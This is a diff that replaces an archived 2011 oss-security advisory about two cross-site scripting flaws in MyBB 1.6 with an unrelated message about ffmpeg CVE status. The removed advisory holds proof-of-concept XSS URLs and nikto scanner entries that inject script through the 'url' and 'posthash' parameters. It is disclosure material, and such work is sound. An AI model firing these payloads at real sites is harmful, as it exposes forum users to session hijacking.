@@ -1,105 +1,27 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/18/7
-Message-ID: <AANLkTim6g4-8hbtUewtY-=yOKt9H=X79KeCpE_OvDEEa@mail.gmail.com>
-Date: Fri, 18 Mar 2011 14:17:35 +0800
-From: YGN Ethical Hacker Group <lists@...g.net>
-To: oss-security@...ts.openwall.com
-Subject: CVE Request: MyBB 1.6 <= Cross Site Scripting Vulnerability
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/09/02/1
+Message-Id: <20110902001752.c7234fff467bb1f411401e2f@gmail.com>
+Date: Fri, 2 Sep 2011 00:17:52 -0400
+From: Michael Gilbert <michael.s.gilbert@...il.com>
+To: oss-security@...ts.openwall.com, coley@...-smtp.mitre.org
+Subject: ffmpeg issues
 Content-Type: text/plain; charset=utf-8
 
-1. OVERVIEW
+Hi,
 
-MyBB was vulnerable to Cross Site Scripting.
+We're trying to figure out the status of ffmpeg in debian [0].  Does
+anyone have any real info on CVE-2011-2160 (whose CVE page is in
+essence completely empty) [1].  BTW, how is a link to the software's
+homepage considered a confirmation of the issue?
 
+Also, CVE-2011-2162 [2] seems to be a rehash of a bunch of CVE ids
+that happened to be in the recent dump of Mandriva advisories.  
+Shouldn't this get REJECTED since its just a collection of already
+known and tracked issues?
 
-2. APPLICATION DESCRIPTION
+Thanks,
+Mike
 
-MyBB is a free bulletin board system software package developed by the
-MyBB Group.
-It's supposed to be developed from XMB and DevBB bulletin board applications.
-
-
-3. VULNERABILITY DESCRIPTION
-
-Two XSS vulnerabilities were found. One is user-driven XSS on "url" parameter.
-User will get xssed upon successful log-in.
-The other is a reflected XSS on "posthash" parameter where the valid
-tid (topic id) is required for successful attack.
-The anti-CSRF check against "my_post_key" parameter was not done in
-thread/post preview mode and thus there came a way for XSS to be
-successful.
-
-
-4. VERSIONS AFFECTED
-
-MyBB 1.6 and lower
-
-
-5. PROOF-OF-CONCEPT/EXPLOIT
-
-User-driven XSS
-http://attacker.in/mybb/member.php?action=login&url=javascript:alert%28/XSS/%29
-
-Reflected XSS
-http://attacker.in/mybb/newreply.php?my_post_key=&subject=XSS&action=do_newreply&posthash="><script>alert(/XSS/)</script>&quoted_ids=&lastpid=1&from_page=1&tid=1&method=quickreply&message=test&previewpost=Preview
-Post
-
-Or try nikto udb_tests
-
-"400003","0","4","/member.php?action=login&url=javascript:alert(/XSS/)","GET","<input
-type=\"hidden\" name=\"url\" value=\"javascript:alert(/XSS/)\"
-/>","","","<input type="hidden" name="url" value=\"\" />","","MyBB 1.6
-<= Cross Site Scripting,  ref:
-http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting","",""
-
-"400004","0","4","/newreply.php?my_post_key=&subject=XSS&action=do_newreply&posthash=\"><script>alert(/XSS/)</script>&quoted_ids=&lastpid=1&from_page=1&tid=1&method=quickreply&message=test&previewpost=Preview
-Post","GET","<input type="hidden" name="posthash"
-value=""><script>alert(/XSS/)</script>" />","","","<input
-type="hidden" name="url" value=\"\" />","","MyBB 1.6 <= Cross Site
-Scripting,  ref:
-http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting","",""
-
-
-6. SOLUTION
-
-Upgrade to 1.6.1
-
-
-7. VENDOR
-
-MyBB Development Team
-http://www.mybb.com/
-
-
-8. CREDIT
-
-This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
-Ethical Hacker Group, Myanmar.
-
-
-9. DISCLOSURE TIME-LINE
-
-2010-12-09: notified vendor
-2010-12-15: vendor released fixed version
-2010-12-20: vulnerability disclosed
-
-
-10. REFERENCES
-
-Original Advisory URL:
-http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting
-Vendor ChangeLog:
-http://blog.mybb.com/2010/12/15/mybb-1-6-1-release-1-4-14-update/
-About MyBB: http://www.mybb.com/about/mybb
-
-
-#yehg [2010-12-20]
-
-#last updated at 2010-12-23
----------------------------------
-Best regards,
-YGN Ethical Hacker Group
-Yangon, Myanmar
-http://yehg.net
-Our Lab | http://yehg.net/lab
-Our Directory | http://yehg.net/hwd
+[0] http://lists.debian.org/debian-security-tracker/2011/08/msg00009.html
+[1] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2160
+[2] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2162
